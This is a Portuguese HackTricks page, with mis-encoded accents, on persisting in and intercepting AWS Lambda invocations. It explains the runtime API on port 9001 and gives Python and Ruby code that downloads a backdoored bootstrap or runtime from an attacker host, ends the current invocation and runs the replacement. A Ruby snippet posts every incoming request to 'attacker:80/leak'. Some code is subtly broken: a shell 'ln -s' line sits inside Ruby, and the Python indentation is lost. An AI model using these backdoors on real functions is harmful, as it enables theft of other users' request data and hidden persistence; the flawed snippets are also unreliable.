# AWS - Roubar Requisi√ß√µes Lambda

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introdu√ß√£o <a href="#python-runtime" id="python-runtime"></a>

Este ataque pressup√µe que voc√™ tenha algum tipo de **acesso a um Lambda em execu√ß√£o**.\
Al√©m disso, √© importante notar que as **invoca√ß√µes Lambda n√£o s√£o completamente separadas umas das outras, mas s√£o isoladas**. Elas podem rodar, embora n√£o simultaneamente, no mesmo ambiente de execu√ß√£o. Com isso em mente, vamos come√ßar a dissecar esse ambiente.

### Isolamento

O isolamento Lambda usa cgroups:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Como o prefixo 'sandbox' n√£o corresponde a nenhum motor de cont√™iner comum (docker, podman, LXD, rkt), pode ser um motor de cont√™iner propriet√°rio, que pode estar usando internamente um runtime de cont√™iner de c√≥digo aberto como [runC](https://github.com/opencontainers/runc).

### Como os Lambdas funcionam  <a href="#python-runtime" id="python-runtime"></a>

Esta parece ser a arquitetura Lambda python:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Um processo fora do cont√™iner, referido como "**slicer**" no bin√°rio init, envia eventos de invoca√ß√£o para o processo **init** via mem√≥ria compartilhada.
2. O processo init configura um servidor HTTP na porta 9001 (fixa), com v√°rios endpoints expostos:
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obter o pr√≥ximo evento de invoca√ß√£o
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì retornar a resposta do manipulador para a invoca√ß√£o
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì retornar um erro de execu√ß√£o
3. No `bootstrap.py`, o seguinte loop **consulta o processo init por um novo evento**, e ent√£o **chama a fun√ß√£o do usu√°rio** para lidar com ele (aqui, o manipulador de requisi√ß√£o que voc√™ fez o upload √© executado).\


<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. A **resposta do manipulador √© ent√£o enviada de volta ao processo init** atrav√©s de um dos seguintes endpoints:
   1. `/{invoke-id}/response` ‚Äì se o manipulador do usu√°rio executou com sucesso
   2. `/{invoke-id}/error` ‚Äì se uma exce√ß√£o foi levantada durante o manuseio da invoca√ß√£o

## Resumo da T√©cnica <a href="#python-runtime" id="python-runtime"></a>

√â poss√≠vel **substituir o script bootstrap** por c√≥digo malicioso para ser capaz de **interceptar dados** enviados para a fun√ß√£o Lambda.\
Note que **outros engines em outros idiomas** t√™m outro **script bootstrap** escrito naquele idioma, ent√£o isso pode ser feito **tamb√©m em outros lambdas usando outros idiomas**, n√£o apenas em python.

## Python <a href="#python-runtime" id="python-runtime"></a>

Do lambda, fa√ßa o download de **`/var/runtime/bootstrap.py`** (ou simplesmente inicie **seu pr√≥prio lambda** e obtenha-o) e adicione o backdoor que estar√° vazando todos os dados enviados para o Lambda. Voc√™ s√≥ precisa adicionar algumas linhas, como:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Substituindo o Runtime

Agora, com o novo **`bootstrap.py` criado**, √© poss√≠vel **baix√°-lo**, **encerrar a invoca√ß√£o lambda atual** e execut√°-lo para **substituir** o leg√≠timo:
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
Ou voc√™ tamb√©m pode usar [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), que terminar√° a invoca√ß√£o como feito anteriormente, executar√° o novo bootstrap e exfiltrar√° a informa√ß√£o.

{% hint style="warning" %}
Se uma fun√ß√£o lambda n√£o for usada por 5-15 minutos, ela ser√° desligada, e todas as altera√ß√µes ser√£o perdidas na pr√≥xima vez que for invocada.
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

Em ruby, o arquivo que voc√™ deseja comprometer √© o **`/var/runtime/lib/runtime.rb`** (obtenha-o do sistema ou executando sua pr√≥pria lambda).

Adicionar um backdoor √© t√£o simples quanto feito na vers√£o python:
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
Ent√£o, voc√™ s√≥ precisa fazer o que fez na vers√£o em python com apenas uma mudan√ßa:

* **Baixe o backdoor em um diret√≥rio**
* **Symlink** `/var/runtime/lib/*` com o diret√≥rio onde o backdoor est√°
* Finalize a invoca√ß√£o lambda atual
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## Refer√™ncias

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
